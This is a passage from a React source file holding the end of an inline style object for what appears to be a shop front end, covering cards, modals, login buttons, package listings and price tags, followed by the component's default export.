    margin: '0 0 10px 0',
    fontWeight: 'bold'
  },
  subtitle: {
    fontSize: '1.2rem',
    margin: '0',
    opacity: '0.9'
  },
  section: {
    marginBottom: '40px',
    padding: '0 20px'
  },
  card: {
    backgroundColor: 'white',
    borderRadius: '15px',
    padding: '30px',
    boxShadow: '0 4px 6px rgba(0,0,0,0.1)',
    maxWidth: '1400px',
    margin: '0 auto',
    width: '100%'
  },
  sectionTitle: {
    fontSize: '1.8rem',
    marginBottom: '20px',
    color: '#333',
    textAlign: 'center'
  },
  error: {
    backgroundColor: '#ffebee',
    color: '#c62828',
    padding: '15px',
    borderRadius: '8px',
    margin: '20px',
    textAlign: 'center',
    border: '1px solid #ffcdd2'
  },
  success: {
    backgroundColor: '#e8f5e8',
    color: '#2e7d32',
    padding: '15px',
    borderRadius: '8px',
    margin: '20px',
    textAlign: 'center',
    border: '1px solid #c8e6c9'
  },
  bundlesRow: {
    display: 'grid',
    gridTemplateColumns: 'repeat(4, 1fr)',
    gap: '20px',
    padding: '15px 0',
    maxWidth: '100%',
    alignItems: 'start',
    gridAutoRows: 'minmax(300px, auto)',
    justifyContent: 'center'
  },
  categoryTitle: {
    fontSize: '2.2rem',
    marginBottom: '30px',
    color: '#333',
    textAlign: 'center',
    fontWeight: 'bold',
    borderBottom: '3px solid #FF6B6B',
    paddingBottom: '15px',
    marginTop: '0'
  },
  noBundles: {
    textAlign: 'center',
    padding: '40px',
    color: '#666',
    fontSize: '1.1rem'
  },
  userSection: {
    display: 'flex',
    alignItems: 'center',
    gap: '15px'
  },
  welcomeText: {
    color: 'white',
    fontSize: '1rem'
  },
  loginButton: {
    backgroundColor: 'rgba(255, 255, 255, 0.2)',
    color: 'white',
    border: '2px solid rgba(255, 255, 255, 0.3)',
    padding: '10px 20px',
    borderRadius: '8px',
    cursor: 'pointer',
    fontSize: '1rem',
    fontWeight: 'bold',
    transition: 'all 0.3s ease'
  },
  logoutButton: {
    backgroundColor: 'rgba(255, 255, 255, 0.1)',
    color: 'white',
    border: '2px solid rgba(255, 255, 255, 0.2)',
    padding: '8px 16px',
    borderRadius: '6px',
    cursor: 'pointer',
    fontSize: '0.9rem',
    transition: 'all 0.3s ease'
  },
  modalOverlay: {
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    zIndex: 1000
  },
  modalContent: {
    position: 'relative',
    backgroundColor: 'white',
    borderRadius: '15px',
    padding: '0',
    maxWidth: '450px',
    width: '90vw',
    maxHeight: '90vh',
    overflow: 'hidden'
  },
  closeButton: {
    position: 'absolute',
    top: '15px',
    right: '20px',
    background: 'rgba(255, 255, 255, 0.9)',
    border: 'none',
    fontSize: '28px',
    cursor: 'pointer',
    color: '#333',
    zIndex: 1001,
    width: '35px',
    height: '35px',
    borderRadius: '50%',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
    transition: 'all 0.3s ease'
  },
  buyHeaderButton: {
    color: 'white',
    border: 'none',
    borderRadius: '8px',
    padding: '10px 28px',
    fontWeight: 'bold',
    fontSize: '1.1rem',
    marginRight: '18px',
    cursor: 'pointer',
    transition: 'background 0.2s, box-shadow 0.2s',
    outline: 'none',
  },
  buyModalContent: {
    position: 'relative',
    backgroundColor: 'white',
    borderRadius: '15px',
    padding: '36px 24px 32px 24px',
    maxWidth: '400px',
    width: '90vw',
    boxShadow: '0 8px 32px rgba(0,0,0,0.18)',
    margin: '0 auto',
    textAlign: 'center',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
  },
  packageList: {
    display: 'flex',
    flexDirection: 'column',
    gap: '18px',
    width: '100%',
    alignItems: 'center',
  },
  packageCard: {
    background: 'linear-gradient(90deg,#f5f7fa,#c3cfe2)',
    borderRadius: '10px',
    padding: '18px 0',
    width: '100%',
    maxWidth: '320px',
    boxShadow: '0 2px 8px rgba(44,62,80,0.07)',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
  },
  packageName: {
    fontSize: '1.15rem',
    fontWeight: 'bold',
    color: '#2c3e50',
    marginBottom: '8px',
  },
  packagePrice: {
    fontSize: '1.3rem',
    color: '#27ae60',
    fontWeight: 'bold',
    letterSpacing: '1px',
  },
  buyPageSection: {
    padding: '30px',
    maxWidth: '1400px',
    margin: '0 auto',
    width: '100%',
    backgroundColor: 'white',
    borderRadius: '15px',
    boxShadow: '0 4px 6px rgba(0,0,0,0.1)',
    marginBottom: '40px',
  },
  specialBundleCard: {
    background: 'linear-gradient(90deg,#f5f7fa,#c3cfe2)',
    borderRadius: '10px',
    padding: '20px',
    boxShadow: '0 2px 8px rgba(44,62,80,0.07)',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    textAlign: 'center',
    border: '3px solid #27ae60',
    minHeight: 220,
  },
  bundleName: {
    fontSize: '1.2rem',
    fontWeight: 'bold',
    color: '#2c3e50',
    marginBottom: '10px',
  },
  priceTag: {
    fontSize: '1.1rem',
    fontWeight: 'bold',
    padding: '8px 15px',
    borderRadius: '8px',
    border: '1px solid',
    display: 'inline-block',
  },
  homeHeaderButton: {
    color: 'white',
    border: 'none',
    borderRadius: '8px',
    padding: '10px 28px',
    fontWeight: 'bold',
    fontSize: '1.1rem',
    marginRight: '18px',
    cursor: 'pointer',
    transition: 'background 0.2s, box-shadow 0.2s',
    outline: 'none',
  },
};

export default App;
